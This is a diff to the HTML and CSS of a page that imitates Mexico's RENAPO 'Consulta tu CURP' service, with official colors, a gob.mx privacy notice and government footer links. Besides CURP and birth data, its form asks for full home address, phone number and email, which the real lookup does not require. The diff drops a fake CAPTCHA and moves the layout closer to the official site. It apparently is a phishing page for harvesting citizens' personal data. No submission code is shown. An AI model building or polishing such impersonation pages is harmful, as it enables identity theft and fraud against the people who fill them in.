@@ -3,309 +3,294 @@
 <head>
 <meta charset="UTF-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-<title>Consulta tu CURP</title>
+<title>Consulta tu CURP - RENAPO</title>
 <style>
-:root{--guinda:#691C32;--guinda-osc:#4A1322;--gris-tab:#E6E6E6;--borde-input:#D1D5DB;--borde-tarjeta:#E5E7EB;--texto:#1F2937;--suave:#6B7280;--rojo:#C0392B;--azul-link:#0A47B5}
+:root{--guinda:#691C32;--guinda-osc:#5a172b;--guinda-int:#8b1c38;--gris-tab:#f3f3f3;--borde-input:#bdbdbd;--texto:#222222;--suave:#555555;--rojo:#d92d20;--azul-link:#0047ab}
 *{box-sizing:border-box;margin:0;padding:0}
-html,body{background:#FFFFFF}
-body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;color:var(--texto);padding:0 0 30px}
+body{font-family:Arial,Helvetica,sans-serif;background:#FFFFFF;color:var(--texto);line-height:1.45}
 
-/* ===== 1) Encabezado: barra clara + franja guinda ===== */
-.barra-gob{
-  background:#F8F9FA;
-  color:#000000;
-  padding:18px 16px;
-  display:flex;
-  align-items:center;
-  justify-content:center;
-  border-bottom:1px solid #E5E7EB;
-}
-.barra-gob .txt{
-  font-size:1.20rem;
-  font-weight:800;
-  letter-spacing:.01em;
-  line-height:1.1;
-  color:#000000;
-  text-align:center;
-}
-.franja-renapo{
-  background:var(--guinda);
+/* ===== Encabezado: degradado rojizo + RENAPO izq + hamburguesa der ===== */
+.header-renapo{
+  background:linear-gradient(90deg,#8b1230 0%,#a01d3f 50%,#c33b60 100%);
   color:#FFFFFF;
-  padding:11px 16px;
+  padding:14px 18px;
   display:flex;
   align-items:center;
   justify-content:space-between;
-  font-size:.72rem;
-  letter-spacing:.10em;
-  text-transform:uppercase;
-  font-weight:700;
-}
-.franja-renapo .hamburguesa{
-  display:flex;
-  flex-direction:column;
-  justify-content:center;
-  gap:4px;
-  width:22px;
-  height:18px;
-  cursor:pointer;
-  background:none;
-  border:none;
-  padding:0;
-}
-.franja-renapo .hamburguesa span{
-  display:block;
-  height:2.4px;
   width:100%;
-  background:#FFFFFF;
-  border-radius:2px;
+  box-sizing:border-box;
 }
-
-/* ===== 2) Ruta (arriba del título, izquierda) ===== */
-.ruta{
-  max-width:365px;
-  margin:0 auto;
-  padding:14px 16px 0;
-  font-size:.70rem;
-  color:var(--suave);
-  display:flex;
-  align-items:center;
-  justify-content:flex-start;
-  gap:2px;
-  flex-wrap:wrap;
-}
-.ruta .casita{color:#111827;display:inline-flex;align-items:center;margin-right:2px}
-.ruta .sep{margin:0 4px;color:#9CA3AF}
-.ruta .actual{color:#111827;font-weight:700}
+.header-renapo .brand{font-size:17px;font-weight:700;letter-spacing:.6px;color:#FFFFFF;text-decoration:none}
+.header-renapo .menu-toggle{background:transparent;border:none;color:#FFFFFF;font-size:24px;line-height:1;cursor:pointer;padding:2px 4px}
 
 /* ===== Contenido ===== */
-.columna-angosta{max-width:365px;margin:0 auto;padding:16px 12px 0}
-.titulo-principal{font-size:1.55rem;line-height:1.12;font-weight:800;color:#1F2937;margin-bottom:14px}
-.subtitulo-busqueda{font-size:1.15rem;font-weight:800;color:#1F2937;padding-bottom:6px;border-bottom:1px solid #E5E7EB;margin-bottom:14px}
-.descripcion{font-size:.78rem;line-height:1.45;color:var(--suave);margin-bottom:18px}
-.tabs-apiladas{display:flex;flex-direction:column;align-items:flex-start}
-.tab-item{border:none;padding:7px 12px;font-size:.76rem;border-radius:0;cursor:pointer;background:var(--gris-tab);color:#4B5563;font-family:inherit;text-align:left;transition:border .15s}
-.tab-item.activa{background:var(--guinda);color:#FFFFFF}
-.tab-item.error{outline:1.5px solid var(--rojo);outline-offset:-1.5px}
-.caja-form{background:#FFFFFF;border:1px solid var(--borde-tarjeta);box-shadow:0 2px 8px rgba(0,0,0,0.03);padding:16px 14px 26px}
-.panel-oculto{display:none}
-.seccion-titulo{font-size:.8rem;font-weight:700;color:var(--guinda);padding-bottom:6px;border-bottom:1px solid #E5E7EB;margin:8px 0 11px}
-.grupo-campo{margin-bottom:11px}
-.grupo-campo:last-child{margin-bottom:0}
-.grupo-campo label{display:block;font-size:.76rem;font-weight:700;line-height:1.25;color:#1F2937;margin-bottom:4px}
-.grupo-campo input,.grupo-campo select{width:100%;height:33px;padding:0 9px;font-size:.78rem;color:var(--texto);background:#FFFFFF;border:1px solid var(--borde-input);border-radius:3px;font-family:inherit}
-.grupo-campo input::placeholder{color:#9CA3AF}
-.grupo-campo input:focus,.grupo-campo select:focus{outline:none;border-color:var(--guinda)}
-/* Estados: error y deshabilitado -> borde rojo */
-.grupo-campo input.error,.grupo-campo select.error{border-color:var(--rojo)!important;background:#FFF5F5;box-shadow:0 0 0 1px var(--rojo) inset}
-.grupo-campo input:disabled,.grupo-campo select:disabled{border-color:var(--rojo);opacity:.75;cursor:not-allowed;background:#FFF5F5}
-.cp-info{font-size:.7rem;color:#1c9c4c;font-weight:700;margin-top:3px;min-height:10px}
+.container{max-width:920px;margin:0 auto;padding:18px 18px 28px}
+.breadcrumb{font-size:13px;color:#444444;margin-bottom:14px;display:flex;align-items:center;gap:6px;flex-wrap:wrap}
+.breadcrumb a{color:#333333;text-decoration:none}
+.breadcrumb .actual{font-weight:700;color:#222222}
+.page-title{font-size:32px;font-weight:700;color:#2b2b2b;margin-bottom:18px}
+.section-search-title{font-size:22px;font-weight:700;color:#2b2b2b;padding-bottom:8px;border-bottom:1px solid #d8d8d8;margin-bottom:14px}
+.search-intro{font-size:15px;color:#333333;margin-bottom:18px}
 
-/* ===== Enlace "¿No conoces tu CURP?" ===== */
-.enlace-curp{display:inline-block;margin-top:8px;font-size:.76rem;color:var(--guinda);text-decoration:underline;cursor:pointer;background:none;border:none;font-family:inherit;padding:0}
-.enlace-curp:active{opacity:.7}
+.tabs{display:flex;border-bottom:1px solid #d0d0d0;margin-bottom:18px;gap:6px}
+.tab-btn{background:#f3f3f3;color:#333333;border:1px solid #d0d0d0;border-bottom:none;padding:10px 14px;font-size:14px;font-weight:600;cursor:pointer;border-radius:4px 4px 0 0;font-family:inherit}
+.tab-btn.active{background:#8b1c38;color:#FFFFFF;border-color:#8b1c38}
+.tab-btn:disabled,.tab-btn.is-disabled{border:1.5px solid var(--rojo);color:#b42318;background:#fef3f2;cursor:not-allowed}
 
-/* ===== CAPTCHA ===== */
-.captcha-box{margin-top:6px;border:1px solid var(--borde-input);border-radius:4px;padding:10px;background:#FAFAFA;transition:border .15s}
-.captcha-box.error{border-color:var(--rojo);background:#FFF5F5}
-.captcha-box.deshabilitado{border-color:var(--rojo);opacity:.85}
-.captcha-fila{display:flex;align-items:center;gap:8px}
-.captcha-img{
-  flex:0 0 auto;
-  width:112px;
-  height:40px;
-  border-radius:3px;
-  background:
-    repeating-linear-gradient(45deg,#DCE6F0 0px,#DCE6F0 2px,transparent 2px,transparent 6px),
-    repeating-linear-gradient(-45deg,#E8EFF6 0px,#E8EFF6 2px,transparent 2px,transparent 7px),
-    #F1F6FB;
-  border:1px solid #B8C6D6;
-  display:flex;
-  align-items:center;
-  justify-content:center;
-  position:relative;
-  overflow:hidden;
-  user-select:none;
-}
-.captcha-img .codigo{
-  font-family:"Courier New",monospace;
-  font-size:1.05rem;
-  font-weight:700;
-  letter-spacing:3px;
-  color:#2C3E50;
-  text-shadow:1px 1px 0 #FFFFFF,-1px -1px 0 #FFFFFF;
-  transform:skewX(-8deg) rotate(-2deg);
-  z-index:2;
-}
-.captcha-img .tachado1,.captcha-img .tachado2{position:absolute;left:-10%;width:120%;height:1.5px;background:#8FA3B8;z-index:1}
-.captcha-img .tachado1{top:56%;transform:rotate(-8deg)}
-.captcha-img .tachado2{top:44%;transform:rotate(6deg)}
-.captcha-refresh{
-  flex:0 0 auto;
-  width:32px;height:32px;
-  border:1px solid #B8C6D6;
-  border-radius:3px;
-  background:#FFFFFF;
-  color:#2C3E50;
-  cursor:pointer;
-  display:flex;align-items:center;justify-content:center;
-  font-size:1rem;
-}
-.captcha-refresh:active{background:#EDF3F9}
-.captcha-input{
-  flex:1;
-  min-width:0;
-  height:32px;
-  padding:0 9px;
-  font-size:.8rem;
-  color:var(--texto);
-  background:#FFFFFF;
-  border:1px solid var(--borde-input);
-  border-radius:3px;
-  font-family:inherit;
-}
-.captcha-input:focus{outline:none;border-color:var(--guinda)}
-.captcha-input.error{border-color:var(--rojo);background:#FFF5F5}
-.captcha-label{font-size:.68rem;color:var(--suave);margin-bottom:6px;display:block}
+.form-group{margin-bottom:14px}
+.form-label{display:block;font-size:15px;font-weight:700;color:#2b2b2b;margin-bottom:8px}
+.form-control{width:100%;padding:11px 12px;font-size:15px;border:1px solid var(--borde-input);border-radius:4px;color:var(--texto);background:#FFFFFF;outline:none;font-family:inherit}
+.form-control::placeholder{color:#888888;text-transform:uppercase;font-weight:600;letter-spacing:.5px}
+.form-control:focus{border-color:#8b1c38}
+.form-control:disabled,.form-control.is-disabled,.form-control.is-error{border:1.5px solid var(--rojo);background:#fffafa}
 
-/* ===== Barra inferior ===== */
-.barra-inferior{margin-top:16px;display:flex;justify-content:space-between;align-items:center;gap:10px}
-.obligatorios{font-size:.76rem;color:var(--suave)}
-.boton-buscar{display:inline-flex;align-items:center;gap:6px;background:#FFFFFF;color:var(--guinda);border:1.4px solid var(--guinda);border-radius:3px;padding:6px 14px;font-size:.78rem;cursor:pointer;font-family:inherit;font-weight:600}
-.boton-buscar:disabled{opacity:.55;cursor:not-allowed;border-color:var(--rojo);color:var(--rojo)}
-.boton-buscar.error{border-color:var(--rojo);color:var(--rojo)}
+.help-curp-link{display:inline-block;margin-top:6px;margin-bottom:14px;font-size:14px;color:#0b57d0;text-decoration:underline;font-family:inherit;background:none;border:none;padding:0;cursor:pointer}
+.required-note{font-size:13px;color:var(--suave);margin-bottom:14px}
+
+.btn-buscar{background-color:#8b1c38;color:#FFFFFF;border:none;border-radius:4px;padding:10px 22px;font-size:15px;font-weight:600;cursor:pointer;font-family:inherit;display:inline-flex;align-items:center;gap:6px}
+.btn-buscar:hover{background-color:var(--guinda)}
+.btn-buscar:disabled,.btn-buscar.is-disabled{border:1.5px solid var(--rojo);background:#fef3f2;color:#b42318;cursor:not-allowed}
+
+.barra-inferior{margin-top:16px;display:flex;justify-content:space-between;align-items:center;gap:10px;flex-wrap:wrap}
+.barra-inferior .obligatorios{font-size:13px;color:var(--suave)}
 .tel-row{display:flex;gap:6px}
-.tel-lada{flex:0 0 46%;display:flex;align-items:center;gap:4px;height:33px;padding:0 6px;border:1px solid var(--borde-input);border-radius:3px;background:#FFFFFF;font-size:.75rem}
-.tel-lada select{border:0;padding:0;height:auto;font-size:.75rem;background:transparent;flex:1;outline:none;font-family:inherit}
+.tel-lada{flex:0 0 44%;display:flex;align-items:center;gap:4px;padding:0 6px;border:1px solid var(--borde-input);border-radius:4px;background:#FFFFFF;font-size:13px;height:40px;overflow:hidden}
+.tel-lada select{border:0;padding:0;height:auto;font-size:13px;background:transparent;flex:1;outline:none;font-family:inherit;min-width:0}
 .tel-num{flex:1}
-.load{width:11px;height:11px;border:2px solid var(--guinda);border-top-color:transparent;border-radius:50%;animation:s .7s linear infinite;display:inline-block;vertical-align:-2px;margin-right:4px}
+.cp-info{font-size:12px;color:#1c9c4c;font-weight:700;margin-top:4px;min-height:10px}
+.load{width:11px;height:11px;border:2px solid #FFFFFF;border-top-color:transparent;border-radius:50%;animation:s .7s linear infinite;display:inline-block}
 @keyframes s{to{transform:rotate(360deg)}}
+.panel-oculto{display:none}
 
-/* ===== 4) Recuadros de información ===== */
-.recuadro-info{
-  background-color:#E3F1F8;
-  border:1px solid #B8D8E8;
-  border-radius:4px;
-  padding:16px 14px;
-  margin-bottom:16px;
-  font-family:"Open Sans",Roboto,-apple-system,sans-serif;
-  color:#1F2937;
-  text-align:center;
+/* ===== Recuadros informativos ===== */
+.info-boxes{margin-top:24px;display:flex;flex-direction:column;gap:16px}
+.info-box{background-color:#dff2fc;border:1px solid #b6dff5;border-radius:6px;padding:20px 16px;text-align:center;color:var(--texto);font-size:15px}
+.info-box-title{font-size:17px;font-weight:700;color:var(--texto);margin-bottom:10px}
+.info-box p{color:var(--texto);margin-bottom:10px}
+.info-box p:last-child{margin-bottom:0}
+.info-url{color:var(--azul-link);text-decoration:underline;text-decoration-color:var(--azul-link);text-underline-offset:2px;font-weight:600;word-break:break-word}
+
+/* ===== Pie rojo (antiguo) ===== */
+.footer-gob{background:linear-gradient(180deg,#9f2241 0%,#8b1c38 100%);color:#FFFFFF;padding:28px 22px;width:100%}
+.footer-list{list-style:none;margin-bottom:22px}
+.footer-item{display:flex;align-items:center;justify-content:space-between;padding:12px 0;border-bottom:1px solid rgba(255,255,255,.16)}
+.footer-item:last-child{border-bottom:none}
+.footer-link{color:#FFFFFF;text-decoration:none;font-size:16px;font-weight:600;line-height:1.35}
+.footer-link.underline{text-decoration:underline;text-underline-offset:3px}
+.footer-chevron{font-size:16px;color:#FFFFFF;opacity:.9;margin-left:12px}
+.footer-social{margin-top:8px;margin-bottom:24px}
+.footer-social-label{display:block;font-size:15px;font-weight:600;margin-bottom:14px}
+.social-icons{display:flex;align-items:center;gap:18px;flex-wrap:wrap}
+.social-icons a{color:#FFFFFF;text-decoration:none;font-size:20px;font-weight:bold;display:inline-flex;align-items:center;justify-content:center;width:28px;height:28px}
+.social-ig{width:20px !important;height:20px !important;border:2px solid #FFFFFF;border-radius:6px;position:relative}
+.social-ig::before{content:"";width:8px;height:8px;border:2px solid #FFFFFF;border-radius:50%}
+.social-ig::after{content:"";width:3px;height:3px;background:#FFFFFF;border-radius:50%;position:absolute;top:2px;right:2px}
+.social-yt{width:24px !important;height:18px !important;border:2px solid #FFFFFF;border-radius:5px;font-size:10px !important;line-height:1}
+.footer-help{display:flex;align-items:center;gap:12px;padding-top:6px}
+.help-asterisk{font-size:28px;font-weight:bold;line-height:1;flex-shrink:0}
+.help-number{font-size:30px;font-weight:700;letter-spacing:-.5px;line-height:1;flex-shrink:0}
+.help-text{font-size:13px;line-height:1.25;color:#FFFFFF;max-width:170px}
+
+/* ===== RECUADRO FINAL GOBIERNO (nuevo) ===== */
+.recuadro-final-gob{
+  background-color:#9f2241;
+  color:#ffffff;
+  padding:28px 20px;
+  font-family:Arial,Helvetica,sans-serif;
+  display:flex;
+  flex-direction:column;
+  gap:22px;
+  width:100%;
+  box-sizing:border-box;
 }
-.recuadro-info:last-child{margin-bottom:0}
-.recuadro-info .info-titulo{font-size:.78rem;font-weight:700;line-height:1.35;color:#1F2937;margin-bottom:8px}
-.recuadro-info .info-cuerpo{font-size:.72rem;font-weight:400;line-height:1.5;color:#1F2937;margin-bottom:6px}
-.recuadro-info .info-cuerpo:last-child{margin-bottom:0}
-.recuadro-info a.info-link{color:var(--azul-link);text-decoration:underline;font-weight:600;word-break:break-all}
-.recuadro-info a.info-link:hover{color:#083A96}
+.recuadro-final-encabezado{display:flex;align-items:center;gap:12px}
+.recuadro-final-escudo{width:68px;height:auto;flex-shrink:0}
+.recuadro-final-titulo-gob{font-size:20px;font-weight:700;line-height:1.05;color:#ffffff}
+.recuadro-final-lista{list-style:none;margin:0;padding:0;display:flex;flex-direction:column;gap:16px}
+.recuadro-final-item{display:flex;align-items:center;justify-content:space-between}
+.recuadro-final-enlace{color:#ffffff;text-decoration:none;font-size:16px;font-weight:600;line-height:1.3}
+.recuadro-final-enlace.subrayado{text-decoration:underline;text-underline-offset:3px}
+.recuadro-final-flecha{color:#ffffff;font-size:16px;margin-left:12px}
+.recuadro-final-redes{display:flex;flex-direction:column;gap:12px}
+.recuadro-final-redes-texto{font-size:15px;font-weight:600;color:#ffffff}
+.recuadro-final-iconos{display:flex;align-items:center;gap:18px}
+.recuadro-final-icono{color:#ffffff;text-decoration:none;font-size:21px;font-weight:700;line-height:1;display:inline-flex;align-items:center;justify-content:center}
+.recuadro-final-079{display:flex;align-items:center;gap:12px;padding-top:4px}
+.recuadro-final-asterisco{font-size:32px;font-weight:700;line-height:1;color:#ffffff}
+.recuadro-final-numero{font-size:36px;font-weight:700;line-height:1;letter-spacing:-0.5px;color:#ffffff}
+.recuadro-final-ayuda{font-size:14px;line-height:1.25;color:#ffffff;margin:0}
 </style>
 </head>
 <body>
 
-<!-- ===== 1) ENCABEZADO ===== -->
-<div class="barra-gob">
-  <div class="txt">Gobierno de MÉXICO</div>
-</div>
-<div class="franja-renapo">
-  <span>RENAPO</span>
-  <button type="button" class="hamburguesa" aria-label="Menú">
-    <span></span><span></span><span></span>
-  </button>
-</div>
+<!-- ===== ENCABEZADO (solo RENAPO + hamburguesa con degradado rojizo) ===== -->
+<header class="header-renapo">
+  <a href="#renapo" class="brand">RENAPO</a>
+  <button type="button" class="menu-toggle" aria-label="Menú">&#9776;</button>
+</header>
 
-<!-- ===== 2) RUTA (arriba del título, izquierda) ===== -->
-<nav class="ruta">
-  <span class="casita" aria-hidden="true">
-    <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="#111827" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><path d="M3 10.5 12 3l9 7.5"/><path d="M5 9.5V21h14V9.5"/><path d="M10 21v-6h4v6"/></svg>
-  </span>
-  <span class="sep">&gt;</span>
-  <span>Inicio</span><span class="sep">&gt;</span>
-  <span class="actual">Consulta tu CURP</span>
-</nav>
+<main class="container">
+  <!-- ===== RUTA ===== -->
+  <nav class="breadcrumb" aria-label="Ruta de navegación">
+    <span>&#127968;</span>
+    <span>&gt;</span>
+    <a href="#inicio">Inicio</a>
+    <span>&gt;</span>
+    <span class="actual">Consulta tu CURP</span>
+  </nav>
 
-<div class="columna-angosta">
-  <h1 class="titulo-principal">Consulta tu<br>CURP</h1>
-  <h2 class="subtitulo-busqueda">Búsqueda</h2>
-  <p class="descripcion">La consulta puede efectuarse indicando la clave CURP cuando ya la conoce o proporcionando su nombre y datos de nacimiento.</p>
+  <h1 class="page-title">Consulta tu CURP</h1>
 
-  <div class="tabs-apiladas">
-    <button type="button" id="btn-tab-curp" class="tab-item activa" onclick="cambiarTab('curp')">Clave Única de Registro de Población</button>
-    <button type="button" id="btn-tab-datos" class="tab-item" onclick="cambiarTab('datos')">Datos Personales</button>
-  </div>
+  <section aria-labelledby="busqueda-heading">
+    <h2 id="busqueda-heading" class="section-search-title">B&uacute;squeda</h2>
+    <p class="search-intro">
+      La consulta puede efectuarse indicando la clave CURP cuando ya la conoce o proporcionando su nombre y datos de nacimiento.
+    </p>
 
-  <form class="caja-form" novalidate>
-    <div id="panel-curp">
-      <div class="grupo-campo">
-        <label for="curp">Clave Única de Registro de<br>Población (CURP)*:</label>
-        <input id="curp" type="text" maxlength="18" autocomplete="off" placeholder="Ingresa tu CURP" style="text-transform:uppercase" />
-        <button type="button" class="enlace-curp" onclick="cambiarTab('datos')">¿No conoces tu CURP?</button>
-      </div>
+    <div class="tabs" role="tablist">
+      <button type="button" id="btn-tab-curp" class="tab-btn active" role="tab" aria-selected="true" onclick="cambiarTab('curp')">
+        Clave &Uacute;nica de Registro de Poblaci&oacute;n
+      </button>
+      <button type="button" id="btn-tab-datos" class="tab-btn" role="tab" aria-selected="false" onclick="cambiarTab('datos')">
+        Datos Personales
+      </button>
     </div>
 
-    <div id="panel-datos" class="panel-oculto">
-      <div class="grupo-campo"><label for="nombre">Nombre(s)*:</label><input id="nombre" type="text" autocomplete="off" placeholder="Ingresa tu nombre(s)" /></div>
-      <div class="grupo-campo"><label for="primer-apellido">Primer apellido*:</label><input id="primer-apellido" type="text" autocomplete="off" placeholder="Ingresa tu primer apellido" /></div>
-      <div class="grupo-campo"><label for="segundo-apellido">Segundo apellido:</label><input id="segundo-apellido" type="text" autocomplete="off" placeholder="Ingresa tu segundo apellido" /></div>
-      <div class="grupo-campo"><label for="dia">Día de nacimiento*:</label><select id="dia"><option value="">Seleccionar el día</option></select></div>
-      <div class="grupo-campo"><label for="mes">Mes de nacimiento*:</label><select id="mes"><option value="">Seleccionar el mes</option></select></div>
-      <div class="grupo-campo"><label for="anio">Año de nacimiento*:</label><select id="anio"><option value="">Seleccionar el año</option></select></div>
-      <div class="grupo-campo"><label for="sexo">Sexo*:</label><select id="sexo"><option value="">Selecciona el sexo</option><option>Mujer</option><option>Hombre</option></select></div>
-      <div class="grupo-campo"><label for="estado">Estado*:</label><select id="estado"><option value="">Selecciona el estado</option><option>Ciudad de México</option><option>Estado de México</option><option>Hidalgo</option><option>Jalisco</option><option>Nuevo León</option><option>Puebla</option><option>Veracruz</option><option>Guanajuato</option><option>Michoacán</option><option>Oaxaca</option><option>Otro</option></select></div>
-
-      <div class="seccion-titulo">Domicilio y contacto</div>
-
-      <div class="grupo-campo"><label for="calle">Calle*:</label><input id="calle" type="text" autocomplete="off" placeholder="Ingresa tu calle" /></div>
-      <div class="grupo-campo"><label for="num-ext">Número exterior*:</label><input id="num-ext" type="text" autocomplete="off" placeholder="Ej. 123" /></div>
-      <div class="grupo-campo"><label for="num-int">Número interior:</label><input id="num-int" type="text" autocomplete="off" placeholder="Ej. Int. 4" /></div>
-      <div class="grupo-campo"><label for="cp">Código postal*:</label><input id="cp" type="text" maxlength="5" autocomplete="off" placeholder="Ej. 01730" /><div class="cp-info" id="cpInfo"></div></div>
-      <div class="grupo-campo"><label for="colonia">Colonia*:</label><input id="colonia" type="text" autocomplete="off" placeholder="Ej. Centro" /></div>
-      <div class="grupo-campo"><label for="municipio">Delegación / Municipio*:</label><input id="municipio" type="text" autocomplete="off" placeholder="Ej. Cuauhtémoc" /></div>
-      <div class="grupo-campo"><label for="estado-dom">Estado*:</label><input id="estado-dom" type="text" autocomplete="off" placeholder="Ej. Ciudad de México" /></div>
-      <div class="grupo-campo"><label for="entre">Entre qué calles:</label><input id="entre" type="text" autocomplete="off" placeholder="Ej. Hidalgo y Morelos" /></div>
-      <div class="grupo-campo">
-        <label for="telefono">Teléfono*:</label>
-        <div class="tel-row">
-          <div class="tel-lada"><select id="lada"></select></div>
-          <input id="telefono" class="tel-num" type="tel" autocomplete="off" placeholder="10 dígitos" />
+    <form id="curpForm" novalidate>
+      <!-- ===== Panel CURP ===== -->
+      <div id="panel-curp">
+        <div class="form-group">
+          <label for="curp" class="form-label">Clave &Uacute;nica de Registro de Poblaci&oacute;n (CURP)*:</label>
+          <input type="text" id="curp" name="curp" class="form-control" placeholder="INGRESA TU CURP" maxlength="18" autocomplete="off" style="text-transform:uppercase" />
+          <button type="button" class="help-curp-link" onclick="cambiarTab('datos')">&iquest;No conoces tu CURP?</button>
         </div>
       </div>
-      <div class="grupo-campo"><label for="email">Correo electrónico*:</label><input id="email" type="email" autocomplete="off" placeholder="correo@dominio.com" /></div>
-    </div>
 
-    <!-- ===== 3) CAPTCHA ===== -->
-    <div class="captcha-box" id="captchaBox">
-      <label class="captcha-label">Verificación de seguridad*:</label>
-      <div class="captcha-fila">
-        <div class="captcha-img" id="captchaImg">
-          <div class="tachado1"></div>
-          <div class="tachado2"></div>
-          <span class="codigo" id="captchaCodigo">A7B3C</span>
+      <!-- ===== Panel Datos Personales ===== -->
+      <div id="panel-datos" class="panel-oculto">
+        <div class="form-group"><label for="nombre" class="form-label">Nombre(s)*:</label><input id="nombre" type="text" class="form-control" autocomplete="off" placeholder="INGRESA TU NOMBRE(S)" /></div>
+        <div class="form-group"><label for="primer-apellido" class="form-label">Primer apellido*:</label><input id="primer-apellido" type="text" class="form-control" autocomplete="off" placeholder="INGRESA TU PRIMER APELLIDO" /></div>
+        <div class="form-group"><label for="segundo-apellido" class="form-label">Segundo apellido:</label><input id="segundo-apellido" type="text" class="form-control" autocomplete="off" placeholder="INGRESA TU SEGUNDO APELLIDO" /></div>
+        <div class="form-group"><label for="dia" class="form-label">D&iacute;a de nacimiento*:</label><select id="dia" class="form-control"><option value="">Seleccionar el d&iacute;a</option></select></div>
+        <div class="form-group"><label for="mes" class="form-label">Mes de nacimiento*:</label><select id="mes" class="form-control"><option value="">Seleccionar el mes</option></select></div>
+        <div class="form-group"><label for="anio" class="form-label">A&ntilde;o de nacimiento*:</label><select id="anio" class="form-control"><option value="">Seleccionar el a&ntilde;o</option></select></div>
+        <div class="form-group"><label for="sexo" class="form-label">Sexo*:</label><select id="sexo" class="form-control"><option value="">Selecciona el sexo</option><option>Mujer</option><option>Hombre</option></select></div>
+        <div class="form-group"><label for="estado" class="form-label">Estado*:</label><select id="estado" class="form-control"><option value="">Selecciona el estado</option><option>Ciudad de M&eacute;xico</option><option>Estado de M&eacute;xico</option><option>Hidalgo</option><option>Jalisco</option><option>Nuevo Le&oacute;n</option><option>Puebla</option><option>Veracruz</option><option>Guanajuato</option><option>Michoac&aacute;n</option><option>Oaxaca</option><option>Otro</option></select></div>
+
+        <h3 style="font-size:15px;font-weight:700;color:#8b1c38;margin:14px 0 10px;padding-bottom:6px;border-bottom:1px solid #e5e5e5">Domicilio y contacto</h3>
+
+        <div class="form-group"><label for="calle" class="form-label">Calle*:</label><input id="calle" type="text" class="form-control" autocomplete="off" placeholder="INGRESA TU CALLE" /></div>
+        <div class="form-group"><label for="num-ext" class="form-label">N&uacute;mero exterior*:</label><input id="num-ext" type="text" class="form-control" autocomplete="off" placeholder="EJ. 123" /></div>
+        <div class="form-group"><label for="num-int" class="form-label">N&uacute;mero interior:</label><input id="num-int" type="text" class="form-control" autocomplete="off" placeholder="EJ. INT. 4" /></div>
+        <div class="form-group"><label for="cp" class="form-label">C&oacute;digo postal*:</label><input id="cp" type="text" class="form-control" maxlength="5" autocomplete="off" placeholder="EJ. 01730" /><div class="cp-info" id="cpInfo"></div></div>
+        <div class="form-group"><label for="colonia" class="form-label">Colonia*:</label><input id="colonia" type="text" class="form-control" autocomplete="off" placeholder="EJ. CENTRO" /></div>
+        <div class="form-group"><label for="municipio" class="form-label">Delegaci&oacute;n / Municipio*:</label><input id="municipio" type="text" class="form-control" autocomplete="off" placeholder="EJ. CUAUHT&Eacute;MOC" /></div>
+        <div class="form-group"><label for="estado-dom" class="form-label">Estado*:</label><input id="estado-dom" type="text" class="form-control" autocomplete="off" placeholder="EJ. CIUDAD DE M&Eacute;XICO" /></div>
+        <div class="form-group"><label for="entre" class="form-label">Entre qu&eacute; calles:</label><input id="entre" type="text" class="form-control" autocomplete="off" placeholder="EJ. HIDALGO Y MORELOS" /></div>
+        <div class="form-group">
+          <label for="telefono" class="form-label">Tel&eacute;fono*:</label>
+          <div class="tel-row">
+            <div class="tel-lada"><select id="lada"></select></div>
+            <input id="telefono" class="tel-num form-control" type="tel" autocomplete="off" placeholder="10 D&Iacute;GITOS" />
+          </div>
         </div>
-        <button type="button" class="captcha-refresh" id="captchaRefresh" aria-label="Refrescar CAPTCHA" title="Refrescar">↻</button>
-        <input id="captchaInput" class="captcha-input" type="text" maxlength="5" autocomplete="off" placeholder="Escribe el código" />
+        <div class="form-group"><label for="email" class="form-label">Correo electr&oacute;nico*:</label><input id="email" type="email" class="form-control" autocomplete="off" placeholder="CORREO@DOMINIO.COM" /></div>
       </div>
+
+      <div class="barra-inferior">
+        <span class="obligatorios">* Campos obligatorios</span>
+        <button type="submit" class="btn-buscar" id="btnBuscar">
+          <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="11" cy="11" r="8"></circle><line x1="21" y1="21" x2="16.65" y2="16.65"></line></svg>
+          Buscar
+        </button>
+      </div>
+    </form>
+  </section>
+
+  <!-- ===== RECUADROS INFORMATIVOS ===== -->
+  <section class="info-boxes" aria-label="Información adicional">
+    <div class="info-box">
+      <h3 class="info-box-title">&iexcl;Sugerencia!</h3>
+      <p>Para solicitar asistencia telef&oacute;nica sobre el servicio de la CURP, puedes comunicarte al Centro de Atenci&oacute;n y Servicios, de lunes a viernes, de 08:00 a 16:00 horas, a los n&uacute;meros telef&oacute;nicos:</p>
+      <p>800 911 11 11, extensiones 15121 y 15421.</p>
     </div>
-  </form>
 
-  <div class="barra-inferior">
-    <span class="obligatorios">* Campos obligatorios</span>
-    <button type="submit" class="boton-buscar" id="btnBuscar">
-      <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="11" cy="11" r="8"></circle><line x1="21" y1="21" x2="16.65" y2="16.65"></line></svg>
-      Buscar
-    </button>
+    <div class="info-box">
+      <h3 class="info-box-title">Aviso de privacidad simplificado de consulta de CURP en l&iacute;nea</h3>
+      <p>
+        La recolecci&oacute;n de datos personales se lleva a cabo a trav&eacute;s de
+        <a href="https://www.gob.mx/curp" class="info-url" target="_blank" rel="noopener noreferrer">https://www.gob.mx/curp</a>,
+        cuyo administrador y responsable del tr&aacute;mite de CURP es la Direcci&oacute;n General del Registro Nacional de Poblaci&oacute;n e Identidad de la Secretar&iacute;a de Gobernaci&oacute;n.
+      </p>
+      <p>Los datos personales que se recaban ser&aacute;n utilizados con la finalidad de buscar, validar y obtener la CURP.</p>
+      <p>
+        Conoce el aviso de privacidad integral en
+        <a href="https://www.gob.mx/curp/privacidadintegral" class="info-url" target="_blank" rel="noopener noreferrer">https://www.gob.mx/curp/privacidadintegral</a>.
+      </p>
+    </div>
+  </section>
+</main>
+
+<!-- ===== PIE ROJO ===== -->
+<footer class="footer-gob" aria-label="Pie de página">
+  <ul class="footer-list">
+    <li class="footer-item"><a href="#enlaces" class="footer-link">Enlaces</a><span class="footer-chevron" aria-hidden="true">&#8964;</span></li>
+    <li class="footer-item"><a href="#que-es-gobmx" class="footer-link">&iquest;Qu&eacute; es gob.mx?</a><span class="footer-chevron" aria-hidden="true">&#8964;</span></li>
